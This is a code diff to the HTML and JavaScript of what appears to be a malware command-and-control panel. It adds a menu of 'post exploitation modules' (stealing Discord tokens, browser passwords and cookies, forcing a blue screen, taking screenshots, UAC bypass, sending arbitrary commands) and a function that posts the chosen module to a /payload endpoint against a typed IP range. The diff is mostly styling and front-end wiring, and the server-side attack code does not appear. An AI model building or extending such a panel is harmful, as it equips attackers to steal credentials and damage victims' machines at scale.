@@ -128,6 +128,41 @@
         td:nth-child(6), td:nth-child(7) {
             text-align: center;
         }
+        .payload-container {
+            margin-top: 20px;
+        }
+        .payload-container select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #444;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+        .payload-container input, .payload-container p {
+            width: 92%;
+            padding: 10px;
+            margin-bottom: 10px;
+            background-color: #444;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            text-align: center;
+        }
+        .payload-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #555;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .payload-container button:hover {
+            background-color: #666;
+        }
     </style>
 </head>
 <body>
@@ -146,7 +181,22 @@
 
 <div id="container">
     <div id="panel">
-        <button onclick="sendPayload()">Send Payload</button>
+        <div class="payload-container">
+            <select id="payload-dropdown">
+                <option value="steal-token">Steal Discord Token</option>
+                <option value="steal-password">Steal Browser Passwords</option>
+                <option value="steal-cookie">Get Browser Cookies</option>
+                <option value="bsod">Blue Screen of Death</option>
+                <option value="screen-shot">Take Screen Shot</option>
+                <option value="uac-bypass">UAC Bypass</option>
+                <option value="send-command">Send Command</option>
+            </select>
+            <p>Structure Your IP like this<br>
+            10.5.1.1-50<br>
+            Will send command to every IP starting in 10.5.1 from 1 to 50</p>
+            <input type="text" id="ip-input" placeholder="Enter IP Address">
+            <button onclick="sendPayload()">Send Post Exploitation Module</button>
+        </div>
     </div>
 
     <div id="map"></div>
@@ -239,6 +289,25 @@
 
     
     //setInterval(updateDevices, 1000);
+
+    function sendPayload() {
+        dropdown = document.getElementById('payload-dropdown').value
+        fetch('/payload', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ 'payload': dropdown, 'ip': document.getElementById('ip-input').value })
+        })
+        .then(response => {
+            console.log('Response from server:', response);
+            updateDevices();
+            document.getElementById('ip-input').value = ""
+        })
+        .catch(error => {
+            console.error('Error sending delete request:', error);
+        });
+    }
     
     // Add event listeners for connect and delete icons
     document.addEventListener('click', (event) => {
